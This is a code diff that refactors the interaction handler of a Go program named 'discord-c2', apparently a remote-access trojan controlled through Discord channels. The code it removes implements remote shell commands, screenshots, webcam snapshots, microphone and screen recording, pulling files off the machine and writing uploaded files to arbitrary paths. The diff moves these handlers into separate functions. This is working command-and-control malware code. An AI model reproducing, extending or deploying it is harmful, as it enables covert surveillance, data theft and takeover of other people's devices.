@@ -1,18 +1,18 @@
 package main
 
+// This file contains the top-level Discord interaction handler that routes
+// slash commands, buttons, and modals to feature-specific handlers.
+
 import (
-	"fmt"
-	"io"
-	"log"
-	"net/http"
-	"os"
-	"path/filepath"
 	"runtime"
-	"strings"
+
+	"discord-c2/actions"
 
 	"github.com/bwmarrin/discordgo"
 )
 
+// handleInteraction dispatches incoming interactions to the appropriate
+// slash-command, component, or modal handler for this device channel.
 func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if i.ChannelID != myChannelId {
 		return
@@ -23,499 +23,35 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		data := i.ApplicationCommandData()
 		switch data.Name {
 		case "help":
-			content := "**D‑C2 Help**\n\n" +
-				"Use these controls in this device channel:\n\n" +
-				"**Slash commands**\n" +
-				"/cmd `<command>`          – run shell command\n" +
-				"/screenshot              – capture screenshots of all displays\n" +
-				"/camera                  – capture a snapshot from the default camera\n" +
-				"/mic `[duration]` `[path]` – record from microphone (seconds, optional path)\n" +
-				"/record `<source>`       – record video in segmented files (camera/screen)\n" +
-				"/log `<on|off>`          – stream or stop logs into this channel\n" +
-				"/cwd                     – show current working directory\n" +
-				"/ls `[path]`              – list directory (current or given path)\n" +
-				"/download `<src>` `[dst]` – download file (src path, optional label)\n" +
-				"/upload `<file>` `<dst>`  – upload attached file to dst path\n" +
-				"/restart                 – restart this client process\n\n" +
-				"**Emoji commands**\n" +
-				"📸                        – capture screenshots of all displays\n" +
-				"📷                        – capture a snapshot from the default camera\n" +
-				"🎙                        – record 10 seconds from microphone\n" +
-				"👇 `<path>`                – download file from this machine (size < 8 MB)\n" +
-				"☝️ `<path>` *attach         – upload attached file to this path\n" +
-				"🔁                        – restart this client\n" +
-				"💀                        – terminate this client\n\n" +
-				"**Buttons**\n" +
-				"whoami                    – show current user\n" +
-				"id                        – show user / UID information\n" +
-				"hostname                  – show device hostname\n" +
-				"ip info                   – show IP configuration\n" +
-				"cwd                       – show current working directory\n\n" +
-				"Send `help` or `/help` anytime to show this help again."
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: content,
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
+			handleSlashHelp(s, i)
 		case "cmd":
-			var cmdStr string
-			for _, opt := range data.Options {
-				if opt.Name == "command" {
-					cmdStr = opt.StringValue()
-					break
-				}
-			}
-			if cmdStr == "" {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "No command provided.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "Running: `" + cmdStr + "`",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			runCommandString(s, i.ChannelID, nil, cmdStr)
+			handleSlashCmd(s, i, data)
 		case "screenshot":
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "📸 Capturing screenshots...",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			handleScreenshot(s, i.ChannelID, nil)
+			handleSlashScreenshot(s, i)
 		case "camera":
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "📷 Capturing camera snapshot...",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			handleCameraSnapshot(s, i.ChannelID, nil)
+			handleSlashCamera(s, i)
 		case "mic":
-			var seconds int64 = 10
-			var path string
-			log.Printf("MIC slash command invoked: channel=%s user=%s", i.ChannelID, i.Member.User.ID)
-			for _, opt := range data.Options {
-				if opt.Name == "duration" {
-					seconds = opt.IntValue()
-				}
-				if opt.Name == "path" {
-					path = opt.StringValue()
-				}
-			}
-			log.Printf("MIC options: seconds=%d path=%s", seconds, path)
-			if seconds <= 0 {
-				seconds = 10
-			}
-			if seconds > 300 {
-				seconds = 300
-			}
-			if strings.HasPrefix(path, "~/") {
-				if home, err := os.UserHomeDir(); err == nil {
-					path = home + string(os.PathSeparator) + path[2:]
-				}
-			}
-			log.Printf("MIC normalized: seconds=%d resolvedPath=%s", seconds, path)
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: fmt.Sprintf("🎙 Recording %d seconds from microphone...", seconds),
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			log.Printf("MIC starting handleMicRecord: channel=%s", i.ChannelID)
-			handleMicRecord(s, i.ChannelID, nil, int(seconds), path)
-			log.Printf("MIC handleMicRecord returned: channel=%s", i.ChannelID)
+			handleSlashMic(s, i, data)
 		case "record":
-			var source string
-			maxSizeMB := int64(2)
-			maxParts := int64(0)
-			totalMinutes := int64(0)
-			quality := "medium"
-			for _, opt := range data.Options {
-				switch opt.Name {
-				case "source":
-					source = strings.ToLower(opt.StringValue())
-				case "max_size_mb":
-					maxSizeMB = opt.IntValue()
-				case "duration_minutes":
-					totalMinutes = opt.IntValue()
-				case "max_parts":
-					maxParts = opt.IntValue()
-				case "quality":
-					quality = strings.ToLower(opt.StringValue())
-				}
-			}
-			if source != "camera" && source != "screen" {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Source must be `camera` or `screen`.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			if maxSizeMB <= 0 {
-				maxSizeMB = 2
-			}
-			if maxSizeMB > 8 {
-				maxSizeMB = 8
-			}
-			var totalSeconds int64
-			if totalMinutes > 0 {
-				totalSeconds = totalMinutes * 60
-			}
-			if maxParts <= 0 {
-				if totalSeconds > 0 {
-					var estKbps int64
-					switch quality {
-					case "low":
-						estKbps = 400
-					case "high":
-						estKbps = 1500
-					default:
-						estKbps = 800
-					}
-					totalBytes := totalSeconds * (estKbps * 1000 / 8)
-					maxBytes := maxSizeMB * 1024 * 1024
-					if maxBytes <= 0 {
-						maxBytes = 2 * 1024 * 1024
-					}
-					parts := totalBytes / maxBytes
-					if totalBytes%maxBytes != 0 {
-						parts++
-					}
-					if parts <= 0 {
-						parts = 1
-					}
-					if parts > 30 {
-						parts = 30
-					}
-					maxParts = parts
-				} else {
-					maxParts = 5
-				}
-			}
-			if maxParts > 30 {
-				maxParts = 30
-			}
-			if quality != "low" && quality != "medium" && quality != "high" {
-				quality = "medium"
-			}
-			if totalSeconds > 0 && maxParts > 0 {
-				seg := totalSeconds / maxParts
-				if seg < 5 {
-					seg = 5
-				}
-				totalSeconds = seg * maxParts
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: fmt.Sprintf("🎥 Starting %s recording with max %d MB per file and up to %d parts (%s quality)%s...", source, maxSizeMB, maxParts, quality, func() string {
-						if totalSeconds > 0 {
-							return fmt.Sprintf(" for approximately %d seconds", totalSeconds)
-						}
-						return ""
-					}()),
-					Flags: discordgo.MessageFlagsEphemeral,
-				},
-			})
-			go handleVideoRecord(s, i.ChannelID, nil, source, int(maxSizeMB), int(maxParts), int(totalSeconds), quality)
+			handleSlashRecord(s, i, data)
 		case "recordstop":
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "Stopping active recording (if any)...",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			go handleVideoStop(s, i.ChannelID, nil)
+			handleSlashRecordStop(s, i)
 		case "log":
-			var mode string
-			for _, opt := range data.Options {
-				if opt.Name == "mode" {
-					mode = strings.ToLower(opt.StringValue())
-					break
-				}
-			}
-			if mode != "on" && mode != "off" {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Mode must be `on` or `off`.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			if mode == "on" {
-				enableLogStreaming(s, i.ChannelID)
-			} else {
-				disableLogStreaming()
-			}
-			resp := "Log streaming disabled for this channel."
-			if mode == "on" {
-				resp = "Log streaming enabled for this channel."
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: resp,
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
+			handleSlashLog(s, i, data)
 		case "cwd":
-			cmd := "pwd"
-			if runtime.GOOS == "windows" {
-				cmd = "cd"
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "Running: `" + cmd + "`",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			runCommandString(s, i.ChannelID, nil, cmd)
+			handleSlashCwd(s, i)
 		case "ls":
-			var path string
-			for _, opt := range data.Options {
-				if opt.Name == "path" {
-					path = opt.StringValue()
-					break
-				}
-			}
-			base := "ls"
-			if runtime.GOOS == "windows" {
-				base = "dir"
-			}
-			cmdStr := base
-			if path != "" {
-				cmdStr = base + " " + path
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "Running: `" + cmdStr + "`",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			runCommandString(s, i.ChannelID, nil, cmdStr)
+			handleSlashLs(s, i, data)
 		case "ps":
-			cmdStr := "ps aux"
-			if runtime.GOOS == "windows" {
-				cmdStr = "tasklist"
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "Running: `" + cmdStr + "`",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			runCommandString(s, i.ChannelID, nil, cmdStr)
+			handleSlashPs(s, i)
 		case "pidinfo":
-			var pidVal int64
-			for _, opt := range data.Options {
-				if opt.Name == "pid" {
-					pidVal = opt.IntValue()
-					break
-				}
-			}
-			if pidVal <= 0 {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Invalid PID.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			cmdStr := ""
-			if runtime.GOOS == "windows" {
-				cmdStr = fmt.Sprintf("tasklist /FI \"PID eq %d\"", pidVal)
-			} else {
-				cmdStr = fmt.Sprintf("ps -p %d -o pid,ppid,user,pcpu,pmem,etime,cmd", pidVal)
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "Running: `" + cmdStr + "`",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			runCommandString(s, i.ChannelID, nil, cmdStr)
+			handleSlashPidInfo(s, i, data)
 		case "download":
-			var srcPath string
-			for _, opt := range data.Options {
-				if opt.Name == "source" {
-					srcPath = opt.StringValue()
-				}
-			}
-			if srcPath == "" {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "No source path provided.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			if strings.HasPrefix(srcPath, "~/") {
-				if home, err := os.UserHomeDir(); err == nil {
-					srcPath = home + string(os.PathSeparator) + srcPath[2:]
-				}
-			}
-			f, err := os.Open(srcPath)
-			if err != nil {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Cannot open file: " + srcPath + " (" + err.Error() + ")",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			defer f.Close()
-			fi, err := f.Stat()
-			if err != nil {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Cannot stat file: " + srcPath + " (" + err.Error() + ")",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			if fi.Size() >= 8388608 {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "File is bigger than 8MB 😔",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "📥 Downloading `" + filepath.Base(srcPath) + "`...",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			fileStruct := &discordgo.File{Name: filepath.Base(srcPath), Reader: f}
-			fileArray := []*discordgo.File{fileStruct}
-			s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
-				Files: fileArray,
-			})
+			handleSlashDownload(s, i, data)
 		case "upload":
-			var destPath string
-			var attachment *discordgo.MessageAttachment
-			for _, opt := range data.Options {
-				if opt.Name == "destination" {
-					destPath = opt.StringValue()
-				}
-				if opt.Name == "source" {
-					if data.Resolved != nil && data.Resolved.Attachments != nil {
-						if id, ok := opt.Value.(string); ok {
-							if a, ok := data.Resolved.Attachments[id]; ok {
-								attachment = a
-							}
-						}
-					}
-				}
-			}
-			if destPath == "" || attachment == nil {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Source attachment and destination path are required.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			if strings.HasPrefix(destPath, "~/") {
-				if home, err := os.UserHomeDir(); err == nil {
-					destPath = home + string(os.PathSeparator) + destPath[2:]
-				}
-			}
-			if info, err := os.Stat(destPath); err == nil && info.IsDir() {
-				destPath = filepath.Join(destPath, attachment.Filename)
-			}
-			out, err := os.Create(destPath)
-			if err != nil {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Cannot create file: " + destPath + " (" + err.Error() + ")",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			defer out.Close()
-			resp, err := http.Get(attachment.URL)
-			if err != nil {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Download failed: " + err.Error(),
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			defer resp.Body.Close()
-			_, err = io.Copy(out, resp.Body)
-			if err != nil {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "Write failed: " + err.Error(),
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "☝️ Uploaded file to " + destPath,
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
+			handleSlashUpload(s, i, data)
 		case "restart":
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "🔁 Restarting client...",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			err := restartClient()
-			if err != nil {
-				s.ChannelMessageSend(i.ChannelID, "Restart failed: "+err.Error())
-			}
+			handleSlashRestart(s, i)
 		default:
 		}
 	case discordgo.InteractionMessageComponent:
@@ -534,7 +70,7 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 				ChannelID: i.ChannelID,
 				GuildID:   i.GuildID,
 			}
-			handleScreenshot(s, i.ChannelID, ref)
+			actions.Screenshot(s, i.ChannelID, ref)
 		case "d2c_run_cmd":
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseModal,
